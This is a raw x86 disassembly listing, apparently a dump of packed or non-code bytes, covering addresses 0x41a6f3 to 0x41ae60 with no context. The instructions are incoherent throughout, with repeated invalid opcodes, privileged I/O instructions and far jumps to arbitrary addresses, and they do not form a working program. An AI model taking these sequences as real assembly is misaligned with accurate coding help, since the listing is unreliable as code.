  41a6f3:	mov    ds:0x256dcd37,eax
  41a6f8:	cmp    BYTE PTR [eax+eax*1-0xf],ah
  41a6fc:	js     0x41a753
  41a6fe:	mov    bl,0xf4
  41a700:	fs xchg edx,eax
  41a702:	pop    ss
  41a703:	mov    ds:0xad0cb4d3,eax
  41a708:	retf   0x7059
  41a70b:	jmp    0x8456:0x4970245f
  41a712:	sbb    al,0xae
  41a714:	mov    ecx,0xcf84349
  41a719:	retf   
  41a71a:	sub    DWORD PTR [ebp+0x67],esi
  41a71d:	mov    ?,WORD PTR [edi-0x29]
  41a720:	call   0xcb48:0x3114784b
  41a727:	retf   
  41a728:	xor    BYTE PTR [ebp+0x5c],dh
  41a72b:	mov    ds:0xa0043229,eax
  41a730:	mov    ebp,0x2a0caf9
  41a735:	and    BYTE PTR [esi+0x1c],bh
  41a738:	outs   dx,DWORD PTR ds:[esi]
  41a739:	dec    eax
  41a73a:	pop    edx
  41a73b:	pop    ecx
  41a73c:	aad    0xcb
  41a73e:	ja     0x41a6dc
  41a740:	mov    ss,WORD PTR [ecx]
  41a742:	sbb    al,0x11
  41a744:	test   DWORD PTR ds:0x847877df,ecx
  41a74a:	mov    eax,0x3ed386f8
  41a74f:	cmp    eax,0x1ca231fc
  41a754:	(bad)  
  41a755:	popa   
  41a756:	stos   BYTE PTR es:[edi],al
  41a757:	aad    0xda
  41a759:	retf   0x22ed
  41a75c:	xor    edx,DWORD PTR [ebx]
  41a75e:	sar    ecx,0x45
  41a761:	clc    
  41a762:	xchg   esi,eax
  41a763:	sub    bh,cl
  41a765:	cdq    
  41a766:	(bad)  
  41a767:	sub    eax,0x2ff09eb4
  41a76c:	shr    DWORD PTR [edx+0x2c798f8a],cl
  41a772:	fldcw  WORD PTR [edx]
  41a774:	or     ah,BYTE PTR [eax-0x67f7735f]
  41a77a:	mov    al,0xb4
  41a77c:	je     0x41a78d
  41a77e:	int    0x5f
  41a780:	mov    ebx,0x3e0250a9
  41a785:	sub    ebp,DWORD PTR [eax-0x5245928c]
  41a78b:	jmp    0x41a798
  41a78d:	lock sbb DWORD PTR [esi+eiz*1],esp
  41a791:	jnp    0x41a7d8
  41a793:	jmp    0x41a734
  41a795:	aad    0xa4
  41a797:	ss retf 
  41a799:	data16 sar BYTE PTR [esi+0x6a],1
  41a79d:	cmp    eax,0x3b011afd
  41a7a2:	loope  0x41a821
  41a7a4:	inc    esi
  41a7a5:	cmp    ah,BYTE PTR [edx-0x49cb6d8b]
  41a7ab:	cmp    al,0x44
  41a7ad:	mov    dl,0x85
  41a7af:	fs lahf 
  41a7b1:	jb     0x41a7d2
  41a7b3:	rcr    al,1
  41a7b5:	cmp    DWORD PTR [edi+edx*8],0xffffff8e
  41a7b9:	aaa    
  41a7ba:	stos   DWORD PTR es:[edi],eax
  41a7bb:	cdq    
  41a7bc:	or     cl,BYTE PTR [ecx]
  41a7be:	leave  
  41a7bf:	jecxz  0x41a7ed
  41a7c1:	adc    BYTE PTR [esi+0x9b33e26],0x54
  41a7c8:	push   ebx
  41a7c9:	arpl   WORD PTR [eax+eiz*8+0x67],di
  41a7cd:	fiadd  WORD PTR [edx]
  41a7cf:	repnz mov ebx,0x9d9ae683
  41a7d5:	mov    ecx,0x844a7ed0
  41a7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7db:	inc    edx
  41a7dc:	jmp    0x41a76b
  41a7de:	dec    ebx
  41a7df:	in     al,0xce
  41a7e1:	jge    0x41a79c
  41a7e3:	mov    esp,0x663e2bc5
  41a7e8:	and    ecx,edx
  41a7ea:	aas    
  41a7eb:	dec    BYTE PTR ds:0x12c2da7d
  41a7f1:	std    
  41a7f2:	loope  0x41a839
  41a7f4:	test   ch,dl
  41a7f6:	idiv   BYTE PTR [edx-0x28]
  41a7f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7fa:	mov    ch,0x29
  41a7fc:	(bad)  [ebp+0x15b3c8c]
  41a802:	push   ecx
  41a803:	loope  0x41a855
  41a805:	xchg   edx,esi
  41a807:	loope  0x41a83d
  41a809:	test   eax,0x4b973237
  41a80e:	mov    ds:0xa1829a08,al
  41a813:	sub    al,0x41
  41a815:	adc    bh,BYTE PTR [eax]
  41a817:	pop    ebx
  41a818:	cli    
  41a819:	mov    ecx,0x7ee81e46
  41a81e:	inc    esp
  41a81f:	std    
  41a820:	and    BYTE PTR [ebp+ebx*1+0x17],dl
  41a824:	in     eax,dx
  41a825:	pop    ebx
  41a826:	jp     0x41a86b
  41a828:	xor    bh,BYTE PTR [ecx]
  41a82a:	push   esi
  41a82b:	retf   0x22b8
  41a82e:	inc    esi
  41a82f:	fcmovu st,st(2)
  41a831:	jge    0x41a87b
  41a833:	fdivr  st(4),st
  41a835:	stos   DWORD PTR es:[edi],eax
  41a836:	dec    ebp
  41a837:	loop   0x41a81d
  41a839:	sub    edi,DWORD PTR [eax+0x47]
  41a83c:	imul   ebx,DWORD PTR [eax-0x7935d52e],0x5abf8dc7
  41a846:	loopne 0x41a7e7
  41a848:	ret    0x6400
  41a84b:	xor    al,0xc2
  41a84d:	jp     0x41a81f
  41a84f:	lahf   
  41a850:	adc    esp,DWORD PTR [esi-0x74]
  41a853:	imul   ebx,DWORD PTR ds:0x5a2da4f1,0x7afa8e60
  41a85d:	inc    ecx
  41a85e:	clc    
  41a85f:	test   ebp,0xa9a568c5
  41a865:	enter  0x90a5,0xb0
  41a869:	cld    
  41a86a:	ins    BYTE PTR es:[edi],dx
  41a86b:	lea    edi,[edi+0xf]
  41a86e:	xchg   ecx,eax
  41a86f:	dec    ecx
  41a870:	push   esp
  41a871:	sub    DWORD PTR [esi-0x73],esi
  41a874:	sahf   
  41a875:	push   es
  41a876:	cmovl  esi,edx
  41a879:	xchg   ecx,eax
  41a87a:	inc    ebx
  41a87b:	push   0x3c5d21eb
  41a880:	jmp    0xc56a3b3c
  41a885:	sar    DWORD PTR [ebx],cl
  41a887:	cmp    DWORD PTR [ebp+0x2be60c00],0x28
  41a88e:	pop    eax
  41a88f:	fcmovne st,st(5)
  41a891:	shl    DWORD PTR ds:0x99cffdad,0xd0
  41a898:	sbb    eax,DWORD PTR [eax-0x52b4197]
  41a89e:	sbb    ebp,ecx
  41a8a0:	ja     0x41a912
  41a8a2:	in     eax,dx
  41a8a3:	(bad)  
  41a8a4:	les    edx,FWORD PTR [eax-0x4c]
  41a8a7:	cmp    al,0xc6
  41a8a9:	icebp  
  41a8aa:	hlt    
  41a8ab:	adc    ecx,esp
  41a8ad:	or     ch,dl
  41a8af:	or     BYTE PTR [esi+0x4082822f],ch
  41a8b5:	fisubr DWORD PTR [ebp+edi*8+0x5b95f015]
  41a8bc:	cmc    
  41a8bd:	and    DWORD PTR [edi],esi
  41a8bf:	add    ebp,DWORD PTR [edi]
  41a8c1:	sub    cl,ch
  41a8c3:	add    eax,0x611e5be0
  41a8c8:	dec    ecx
  41a8c9:	xor    eax,0xecc6da66
  41a8ce:	jae    0x41a8f9
  41a8d0:	xchg   ebx,eax
  41a8d1:	dec    edi
  41a8d2:	push   0xffffffd0
  41a8d4:	jecxz  0x41a89b
  41a8d6:	pop    DWORD PTR [esi+edi*1-0x73]
  41a8da:	adc    esp,DWORD PTR [edx+0x72]
  41a8dd:	sub    DWORD PTR [eax+0x54],edx
  41a8e0:	and    DWORD PTR [ebx+0x55],edx
  41a8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8e4:	adc    cl,al
  41a8e6:	daa    
  41a8e7:	push   0xffffff8f
  41a8e9:	mov    esi,0xe21014b
  41a8ee:	loop   0x41a933
  41a8f0:	imul   eax,esp,0xffffffcc
  41a8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f4:	xchg   edx,eax
  41a8f5:	mov    esi,0x2a5ab9a3
  41a8fa:	add    ch,BYTE PTR [eax-0x2c6a7998]
  41a900:	mov    eax,0x5d8ca897
  41a905:	fild   WORD PTR [edx+esi*8]
  41a908:	and    eax,0xe47f3512
  41a90d:	cmp    al,dh
  41a90f:	sub    BYTE PTR [edx+0x68e35435],al
  41a915:	cli    
  41a916:	mov    ebx,0x481eefe9
  41a91b:	dec    edx
  41a91c:	dec    edi
  41a91d:	ins    DWORD PTR es:[edi],dx
  41a91e:	repnz clc 
  41a920:	je     0x41a95f
  41a922:	imul   DWORD PTR [esi-0x70]
  41a925:	adc    BYTE PTR fs:[edi],dl
  41a928:	aam    0x1d
  41a92a:	ret    0x67e3
  41a92d:	out    dx,eax
  41a92e:	out    dx,al
  41a92f:	sub    eax,esi
  41a931:	mov    dh,0xbd
  41a933:	xor    DWORD PTR [edi-0x53235a3f],0xfffffffd
  41a93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a93b:	retf   0x3874
  41a93e:	aaa    
  41a93f:	cld    
  41a940:	mov    ch,0xf8
  41a942:	jg     0x41a995
  41a944:	add    bl,al
  41a946:	xor    bh,BYTE PTR [edi+0x50]
  41a949:	into   
  41a94a:	or     cl,BYTE PTR [ecx]
  41a94c:	adc    DWORD PTR [esi*1+0x1d4c988e],edx
  41a953:	mov    edx,0x2ebbe948
  41a958:	pop    ebx
  41a959:	push   es
  41a95a:	dec    ebx
  41a95b:	clc    
  41a95c:	bnd jle 0x41a9a4
  41a95f:	arpl   cx,ax
  41a961:	rcr    DWORD PTR ds:0xa2ff3b2c,1
  41a967:	sub    edi,0x0
  41a96a:	inc    esp
  41a96b:	push   esi
  41a96c:	sbb    ch,ah
  41a96e:	sbb    BYTE PTR [eax+0x48c30810],0xb3
  41a975:	dec    ebx
  41a976:	dec    DWORD PTR [esi]
  41a978:	mov    cl,0xd3
  41a97a:	mov    esp,0xa480c322
  41a97f:	cld    
  41a980:	in     eax,dx
  41a981:	mov    ebx,0x51492a45
  41a986:	sub    bh,BYTE PTR [ecx+0x6b]
  41a989:	fwait
  41a98a:	jnp    0x41a977
  41a98c:	push   edi
  41a98d:	push   esi
  41a98e:	call   0xc5f58f95
  41a993:	sub    al,0x7b
  41a995:	adc    bl,al
  41a997:	out    0xf8,eax
  41a999:	rol    DWORD PTR ds:0x33697331,cl
  41a99f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9a0:	xor    edi,edi
  41a9a2:	(bad)  
  41a9a3:	frstor [ebp+0x6c4f81f9]
  41a9a9:	push   cs
  41a9aa:	popa   
  41a9ab:	loopne 0x41a9da
  41a9ad:	xor    al,0x2e
  41a9af:	fldenv [esp+ebx*2+0x70ba698b]
  41a9b6:	(bad)  
  41a9b7:	outs   dx,DWORD PTR ds:[esi]
  41a9b8:	mov    cl,0x65
  41a9ba:	and    ah,BYTE PTR [edi-0x1dfe7a49]
  41a9c0:	adc    al,0x42
  41a9c2:	cmp    al,0x9a
  41a9c4:	daa    
  41a9c5:	jmp    0xf5be:0xf59b1474
  41a9cc:	iret   
  41a9cd:	mov    eax,0x96334d8c
  41a9d2:	jno    0x41a973
  41a9d4:	push   0xffffff8a
  41a9d6:	rcl    BYTE PTR [ecx+0x69],0x8d
  41a9da:	aaa    
  41a9db:	ffreep st(1)
  41a9dd:	inc    ebp
  41a9de:	xchg   esp,eax
  41a9df:	retf   
  41a9e0:	int3   
  41a9e1:	ss or  esi,0x58
  41a9e5:	fdiv   QWORD PTR [eax+0x7128c8e3]
  41a9eb:	push   ss
  41a9ec:	mov    cl,0x83
  41a9ee:	mov    bl,0x35
  41a9f0:	nop
  41a9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f2:	clc    
  41a9f3:	dec    esp
  41a9f4:	jae    0x41aa1d
  41a9f6:	add    al,0x33
  41a9f8:	sub    ah,BYTE PTR [edi+edi*4+0x6073c0ad]
  41a9ff:	adc    DWORD PTR [edi+0x8],ebp
  41aa02:	xchg   ecx,eax
  41aa03:	mov    eax,0xa6b73dee
  41aa08:	popa   
  41aa09:	jp     0x41a98c
  41aa0b:	sub    ch,BYTE PTR [edx]
  41aa0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa0e:	and    ebx,DWORD PTR [edi]
  41aa10:	jl     0x41aa91
  41aa12:	stc    
  41aa13:	das    
  41aa14:	loop   0x41aa36
  41aa16:	jbe    0x41a9a0
  41aa18:	add    al,0xbb
  41aa1a:	sbb    al,0xb
  41aa1c:	cli    
  41aa1d:	out    0x2d,eax
  41aa1f:	imul   eax,esp,0xffffffa1
  41aa22:	xchg   DWORD PTR [edi],eax
  41aa24:	cmpxchg DWORD PTR [edi+0x391ed7a0],esi
  41aa2b:	stos   BYTE PTR es:[edi],al
  41aa2c:	hlt    
  41aa2d:	dec    esi
  41aa2e:	mov    esi,DWORD PTR [edi]
  41aa30:	inc    edi
  41aa31:	push   edi
  41aa32:	and    ebp,edx
  41aa34:	ficomp DWORD PTR [esi-0x80]
  41aa37:	jg     0x41aa48
  41aa39:	je     0x41a9c6
  41aa3b:	push   esi
  41aa3c:	add    al,0xab
  41aa3e:	aam    0x4d
  41aa40:	jne    0x41aa1e
  41aa42:	lock mov dh,0x58
  41aa45:	or     ch,BYTE PTR [ebp-0x3b]
  41aa48:	and    eax,0x67c2e7ed
  41aa4d:	cmovs  eax,DWORD PTR [eax-0x560db4d4]
  41aa54:	pop    esi
  41aa55:	xchg   ecx,eax
  41aa56:	retf   
  41aa57:	jmp    0x96ee:0x9bd823b3
  41aa5e:	xor    bh,dl
  41aa60:	sub    ecx,esp
  41aa62:	test   al,0x9d
  41aa64:	cdq    
  41aa65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa66:	div    bh
  41aa68:	push   ss
  41aa69:	out    0xff,eax
  41aa6b:	sub    eax,0xb18af690
  41aa70:	mov    gs,ecx
  41aa72:	and    ah,BYTE PTR [ebx-0x6]
  41aa75:	shl    DWORD PTR [esi-0x38],1
  41aa78:	sub    eax,DWORD PTR cs:[esi-0x73a4b251]
  41aa7f:	xchg   edi,eax
  41aa80:	jbe    0x41aac6
  41aa82:	fstp   QWORD PTR [esi+0x5b]
  41aa85:	lea    esp,[ebp+0x51]
  41aa88:	or     DWORD PTR [eax+0x315c62f4],edx
  41aa8e:	dec    eax
  41aa8f:	fimul  WORD PTR [edx+0x5b11df8b]
  41aa95:	push   esi
  41aa96:	cld    
  41aa97:	pop    ss
  41aa98:	out    0xc4,al
  41aa9a:	add    ch,0xb8
  41aa9d:	jb     0x41aae2
  41aa9f:	pop    esi
  41aaa0:	push   0x6a209863
  41aaa5:	les    eax,FWORD PTR [esi]
  41aaa7:	in     eax,dx
  41aaa8:	icebp  
  41aaa9:	leave  
  41aaaa:	pusha  
  41aaab:	xor    BYTE PTR [esi],al
  41aaad:	arpl   WORD PTR [edx-0x68f545a9],cx
  41aab3:	cmc    
  41aab4:	repz lea esi,[ebx+esi*1]
  41aab8:	add    esp,ebx
  41aaba:	mov    dh,0x7
  41aabc:	inc    ecx
  41aabd:	add    al,BYTE PTR [ebx-0x39]
  41aac0:	mov    cl,0x4b
  41aac2:	es mov ebx,0xcad8d3cb
  41aac8:	sub    al,0x44
  41aaca:	push   edi
  41aacb:	lock cld 
  41aacd:	push   ebx
  41aace:	out    0xfc,eax
  41aad0:	jp     0x41aad8
  41aad2:	or     al,0xb
  41aad4:	mov    DWORD PTR [edx+0x7f4db757],esp
  41aada:	add    al,0x7c
  41aadc:	dec    esi
  41aadd:	inc    ebx
  41aade:	ins    DWORD PTR es:[edi],dx
  41aadf:	mov    bl,0x3e
  41aae1:	adc    al,BYTE PTR [edx-0x3b]
  41aae4:	sub    eax,0xf5a86ed4
  41aae9:	nop
  41aaea:	push   ebp
  41aaeb:	and    edx,DWORD PTR [ebx]
  41aaed:	popf   
  41aaee:	jo     0x41aa84
  41aaf0:	mov    cs,WORD PTR [edx+edx*8]
  41aaf3:	add    eax,0x274e19d0
  41aaf8:	xchg   edi,eax
  41aaf9:	rol    bh,cl
  41aafb:	push   es
  41aafc:	shr    BYTE PTR [ebx+esi*2-0x1a],cl
  41ab00:	adc    bh,BYTE PTR [edx]
  41ab02:	enter  0x43cf,0x8d
  41ab06:	xchg   edx,eax
  41ab07:	call   0xf3eb:0xea267713
  41ab0e:	and    bl,cl
  41ab10:	(bad)  
  41ab11:	fidiv  WORD PTR [esi+0x1e]
  41ab14:	fdivr  QWORD PTR [ebp+ebp*8+0xc]
  41ab18:	mov    al,0xc9
  41ab1a:	mov    edi,0x8182c94b
  41ab1f:	mov    WORD PTR [ebx-0x5a639d86],es
  41ab25:	adc    ch,BYTE PTR [edx]
  41ab27:	jo     0x41ab9a
  41ab29:	outs   dx,DWORD PTR ds:[esi]
  41ab2a:	repnz mov cs:0xf18fa5e8,eax
  41ab31:	xchg   esp,eax
  41ab32:	or     eax,0xffdc505a
  41ab37:	je     0x41ab8a
  41ab39:	xchg   DWORD PTR [eax+0x389d6c7e],ecx
  41ab3f:	(bad)  
  41ab41:	jp     0x41aae7
  41ab43:	out    dx,eax
  41ab44:	cs out 0xc1,eax
  41ab47:	cwde   
  41ab48:	ffree  st(0)
  41ab4a:	inc    esi
  41ab4b:	mov    edi,0xf7fb9424
  41ab50:	or     DWORD PTR [edx],eax
  41ab52:	mov    ah,0x12
  41ab54:	mov    ah,0xf
  41ab56:	pop    edx
  41ab57:	sub    BYTE PTR [ebx-0xbaf6f90],al
  41ab5d:	mov    ds:0xb9839bf2,al
  41ab62:	jae    0x41ab91
  41ab64:	and    BYTE PTR [eax*2-0x40c8219e],dh
  41ab6b:	dec    edi
  41ab6c:	mov    ecx,DWORD PTR [esi-0x1cff14be]
  41ab72:	cmp    eax,0x6b441ba5
  41ab77:	sub    eax,0x6cbf462d
  41ab7c:	cwde   
  41ab7d:	lods   al,BYTE PTR ds:[esi]
  41ab7e:	stc    
  41ab7f:	or     ecx,DWORD PTR [eax+0x614abcbb]
  41ab85:	pop    ebx
  41ab86:	xor    al,0xb
  41ab88:	and    al,0xf5
  41ab8a:	sbb    BYTE PTR [esi+eiz*4-0x71867120],bl
  41ab91:	not    DWORD PTR [eax]
  41ab93:	sub    al,0x4b
  41ab95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab96:	pop    esp
  41ab97:	(bad)  
  41ab98:	loope  0x41abe0
  41ab9a:	mov    ebp,0x9967f052
  41ab9f:	mov    DWORD PTR [ebp+0x7035f773],ebx
  41aba5:	test   eax,0x7d56391
  41abaa:	ficomp DWORD PTR [eax+0x8]
  41abad:	sbb    dl,ch
  41abaf:	not    DWORD PTR [esi]
  41abb1:	hlt    
  41abb2:	push   esp
  41abb3:	inc    eax
  41abb4:	dec    esp
  41abb5:	aaa    
  41abb6:	inc    ebx
  41abb7:	arpl   WORD PTR [ebx],si
  41abb9:	pop    esp
  41abba:	xchg   ebp,eax
  41abbb:	sti    
  41abbc:	xchg   ebp,eax
  41abbd:	jo     0x41aba0
  41abbf:	es es sar ebp,1
  41abc3:	pop    DWORD PTR [eax-0x23016efe]
  41abc9:	cdq    
  41abca:	test   DWORD PTR [ebx],edx
  41abcc:	sub    ebp,ebp
  41abce:	sbb    BYTE PTR [ecx],bh
  41abd0:	mov    ebp,0x86614391
  41abd5:	arpl   WORD PTR [edx],cx
  41abd7:	int3   
  41abd8:	sub    al,0x2b
  41abda:	and    DWORD PTR [esi-0x7d49683a],0x5
  41abe1:	push   esi
  41abe2:	adc    DWORD PTR [edx],ebp
  41abe4:	xor    ecx,esp
  41abe6:	mov    BYTE PTR [ebx],dh
  41abe8:	pop    edx
  41abe9:	inc    edx
  41abea:	inc    edi
  41abeb:	sti    
  41abec:	in     al,0xf
  41abee:	les    ecx,FWORD PTR [ecx+0x4e06954d]
  41abf4:	outs   dx,DWORD PTR ds:[esi]
  41abf5:	push   ss
  41abf6:	push   0x86a0655a
  41abfb:	in     eax,dx
  41abfc:	fisttp WORD PTR [eax+0x35]
  41abff:	test   BYTE PTR [edi-0x2398ce45],cl
  41ac05:	or     DWORD PTR ds:0x4e409471,ecx
  41ac0b:	sahf   
  41ac0c:	jnp    0x41abdc
  41ac0e:	push   cs
  41ac0f:	pop    es
  41ac10:	mov    esi,0x2c332f59
  41ac15:	mov    WORD PTR [eax+0x43aa906d],cs
  41ac1b:	inc    edx
  41ac1c:	scas   eax,DWORD PTR es:[edi]
  41ac1d:	(bad)  
  41ac1e:	jmp    0x1cdd06fc
  41ac23:	pop    ds
  41ac24:	cmp    eax,0x1e583ff6
  41ac29:	push   eax
  41ac2a:	mov    dh,0xc2
  41ac2c:	test   al,0xb1
  41ac2e:	and    edi,DWORD PTR [eax+0x69]
  41ac31:	mov    dl,0x5f
  41ac33:	xor    eax,0x847b1a2e
  41ac38:	cli    
  41ac39:	mov    ds:0xdc95e261,eax
  41ac3e:	lahf   
  41ac3f:	fimul  WORD PTR [ebx]
  41ac41:	hlt    
  41ac42:	stc    
  41ac43:	ss mov bh,0xf0
  41ac46:	lea    ebx,[eax+edi*8-0x11]
  41ac4a:	(bad)  
  41ac4b:	inc    esp
  41ac4c:	pop    ss
  41ac4d:	or     ch,ch
  41ac4f:	or     DWORD PTR [edx+0x7d7e4a7],0x30
  41ac56:	outs   dx,DWORD PTR ds:[esi]
  41ac57:	xchg   DWORD PTR [edi+ecx*2+0x5e],ecx
  41ac5b:	xor    al,0x42
  41ac5d:	and    DWORD PTR [ebx-0x5e],edx
  41ac60:	mov    ebx,0xc5f5a9dd
  41ac65:	pop    edi
  41ac66:	pushf  
  41ac67:	aam    0xb4
  41ac69:	mov    dl,0x8d
  41ac6b:	xchg   BYTE PTR [edx+0x14],bh
  41ac6e:	jb     0x41ac76
  41ac70:	nop
  41ac71:	xchg   ecx,eax
  41ac72:	repz or esi,DWORD PTR [ecx-0x1dd34ce9]
  41ac79:	jge    0x41ac59
  41ac7b:	cmp    ecx,DWORD PTR [ebx+0x39]
  41ac7e:	inc    ecx
  41ac7f:	pop    es
  41ac80:	dec    esi
  41ac81:	test   eax,0xae814ca3
  41ac86:	call   0xc10a:0xe1379f54
  41ac8d:	retf   
  41ac8e:	xor    DWORD PTR [ecx+esi*8+0x1d],edx
  41ac92:	fld    DWORD PTR [esi+ebp*4-0x44b0ba4c]
  41ac99:	pop    eax
  41ac9a:	(bad)  
  41ac9b:	frstor [edi-0x320edc4e]
  41aca1:	mov    ch,0x8d
  41aca3:	enter  0xcd33,0xa6
  41aca7:	mov    al,ds:0xab3bf5f
  41acac:	sbb    eax,0x4673c024
  41acb1:	jae    0x41aca0
  41acb3:	push   0xffffffff
  41acb5:	pop    ecx
  41acb6:	and    edi,edx
  41acb8:	shl    DWORD PTR [ebx+eiz*2],1
  41acbb:	mov    ecx,0xde33acb8
  41acc0:	cli    
  41acc1:	imul   BYTE PTR [eax-0x7eaeeed9]
  41acc7:	aam    0xa4
  41acc9:	fnclex 
  41accb:	dec    ebp
  41accc:	sbb    bh,BYTE PTR [esi+0x5f]
  41accf:	sub    BYTE PTR [ebx],bl
  41acd1:	ret    
  41acd2:	aaa    
  41acd3:	jns    0x41acfc
  41acd5:	adc    al,0x54
  41acd7:	xchg   ebx,eax
  41acd8:	cmp    edx,DWORD PTR [esi+0x21]
  41acdb:	xor    edi,ecx
  41acdd:	leave  
  41acde:	outs   dx,DWORD PTR ds:[esi]
  41acdf:	test   BYTE PTR [ecx],dh
  41ace1:	jbe    0x41ac63
  41ace3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace4:	loope  0x41ad28
  41ace6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ace7:	popf   
  41ace8:	adc    BYTE PTR [eax+0x4faedf95],cl
  41acee:	idiv   DWORD PTR [edi+edi*2+0x54]
  41acf2:	cmp    DWORD PTR [esi+edx*8],ebp
  41acf5:	jmp    0x41acb1
  41acf7:	mul    bl
  41acf9:	fldl2e 
  41acfb:	or     ebp,edi
  41acfd:	mov    eax,0x236331f4
  41ad02:	leave  
  41ad03:	dec    ebx
  41ad04:	sbb    al,ch
  41ad06:	cmp    al,0x31
  41ad08:	bound  edx,QWORD PTR ds:0xd7cc72d4
  41ad0e:	test   ch,dh
  41ad10:	push   edi
  41ad11:	push   es
  41ad12:	jp     0x41ad76
  41ad14:	mov    ecx,DWORD PTR [ebx]
  41ad16:	and    eax,0xcd718e6a
  41ad1b:	unpckhps xmm6,XMMWORD PTR [ecx-0x25]
  41ad1f:	push   esi
  41ad20:	retf   
  41ad21:	sbb    al,0x59
  41ad23:	pop    es
  41ad24:	pop    esp
  41ad25:	stc    
  41ad26:	jl     0x41ad3f
  41ad28:	or     eax,0xff78ffd1
  41ad2d:	xchg   edx,eax
  41ad2e:	adc    edi,DWORD PTR [ecx-0x8]
  41ad31:	retf   0x56bc
  41ad34:	mov    esi,0x1eb086a
  41ad39:	pop    ebp
  41ad3a:	push   0xb5035009
  41ad3f:	or     al,0xec
  41ad41:	iret   
  41ad42:	outs   dx,BYTE PTR ds:[esi]
  41ad43:	lods   eax,DWORD PTR ds:[esi]
  41ad44:	iret   
  41ad45:	xchg   edi,eax
  41ad46:	into   
  41ad47:	jne    0x41ad85
  41ad49:	add    ch,BYTE PTR [ebp+0x38]
  41ad4c:	aaa    
  41ad4d:	sbb    al,0xfe
  41ad4f:	cwde   
  41ad50:	push   eax
  41ad51:	jge    0x41ad68
  41ad53:	sbb    ah,BYTE PTR [esi-0x15]
  41ad56:	jo     0x41ad0c
  41ad58:	push   ds
  41ad59:	arpl   WORD PTR [edi],si
  41ad5b:	test   ah,cl
  41ad5d:	mov    BYTE PTR [ebx],bl
  41ad5f:	adc    esp,ebx
  41ad61:	xor    eax,DWORD PTR [ebp+0x71e456cd]
  41ad67:	xchg   ebx,eax
  41ad68:	call   0x802efd82
  41ad6d:	sub    DWORD PTR [ecx],ebx
  41ad6f:	std    
  41ad70:	(bad)  
  41ad71:	stc    
  41ad72:	jp     0x41ad9e
  41ad74:	dec    eax
  41ad75:	adc    al,0x13
  41ad77:	rcr    DWORD PTR [ebx],0xee
  41ad7a:	mov    bl,0x6c
  41ad7c:	lods   al,BYTE PTR ds:[esi]
  41ad7d:	mov    bl,0xc4
  41ad7f:	dec    ecx
  41ad80:	push   0x13
  41ad82:	pop    ecx
  41ad83:	popa   
  41ad84:	lds    ebp,FWORD PTR [edx-0x33f130b4]
  41ad8a:	fwait
  41ad8b:	xor    eax,0xe17801a6
  41ad90:	pop    ecx
  41ad91:	cmp    ah,ah
  41ad93:	mov    ds,WORD PTR [ecx+0x15]
  41ad96:	adc    edx,0xa
  41ad99:	jae    0x41ada7
  41ad9b:	mov    eax,0xa6ff0aaa
  41ada0:	les    ebx,FWORD PTR [edx+0x77603e75]
  41ada6:	inc    edi
  41ada7:	jl     0x41ad2c
  41ada9:	shl    BYTE PTR [eax-0x5c49b6b8],1
  41adaf:	mov    al,ds:0x91ff894b
  41adb4:	inc    ebp
  41adb5:	mov    edi,0xe4a8f23c
  41adba:	or     esi,DWORD PTR [ebp+0x61b9e757]
  41adc0:	mov    edi,0xd76c3f89
  41adc5:	xor    BYTE PTR ds:0xc62dab5c,0xa4
  41adcc:	test   al,0x8e
  41adce:	into   
  41adcf:	pop    ds
  41add0:	xor    cl,dh
  41add2:	xor    BYTE PTR [ebx],bl
  41add4:	pop    ebx
  41add5:	cdq    
  41add6:	mov    ah,0x9a
  41add8:	jmp    0x41adb1
  41adda:	push   0x4b928238
  41addf:	out    dx,al
  41ade0:	cwde   
  41ade1:	jo     0x41ade3
  41ade3:	sbb    al,0xbe
  41ade5:	mov    fs,WORD PTR [esi-0xdc123f]
  41adeb:	in     eax,dx
  41adec:	xor    BYTE PTR [ecx],bh
  41adee:	nop
  41adef:	jge    0x41adc5
  41adf1:	aaa    
  41adf2:	add    DWORD PTR [edx+0x5b914eef],0xb7e91f94
  41adfc:	dec    eax
  41adfd:	in     eax,0x24
  41adff:	and    DWORD PTR [ecx-0x1d],edi
  41ae02:	xor    DWORD PTR [edx+0x7d],ecx
  41ae05:	jecxz  0x41adea
  41ae07:	xor    BYTE PTR ds:0x69e69529,0xf9
  41ae0e:	icebp  
  41ae0f:	mov    BYTE PTR [ecx],bh
  41ae11:	add    al,0x99
  41ae13:	fdivr  DWORD PTR [edx]
  41ae15:	mov    esp,0x210fd5d0
  41ae1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1b:	mov    esp,esp
  41ae1d:	inc    edi
  41ae1e:	push   edi
  41ae1f:	fcom   QWORD PTR [ebp-0x77]
  41ae22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae23:	ret    0x839a
  41ae26:	jb     0x41ae21
  41ae28:	adc    BYTE PTR [ebx-0x7d],0xbc
  41ae2c:	add    cl,BYTE PTR [ebp-0x8]
  41ae2f:	pop    esp
  41ae30:	dec    ebx
  41ae31:	(bad)  
  41ae32:	ins    BYTE PTR es:[edi],dx
  41ae33:	xor    ah,BYTE PTR [edx+esi*1-0x4a]
  41ae37:	sbb    BYTE PTR [edi],ah
  41ae39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae3a:	cld    
  41ae3b:	out    dx,eax
  41ae3c:	sbb    DWORD PTR [edx-0x59715e59],ebx
  41ae42:	push   edi
  41ae43:	mov    esp,DWORD PTR [ebx+0x13]
  41ae46:	push   ss
  41ae47:	xchg   ebp,eax
  41ae48:	mov    DWORD PTR [eax],ecx
  41ae4a:	jno    0x41aeb5
  41ae4c:	mov    al,ds:0x894df138
  41ae51:	aad    0x53
  41ae53:	imul   esp,DWORD PTR [ebp+eax*8+0x3b],0xd
  41ae58:	popf   
  41ae59:	mov    eax,ds:0xf8e74245
  41ae5e:	jb     0x41ae30
  41ae60:	xchg   ebx,eax
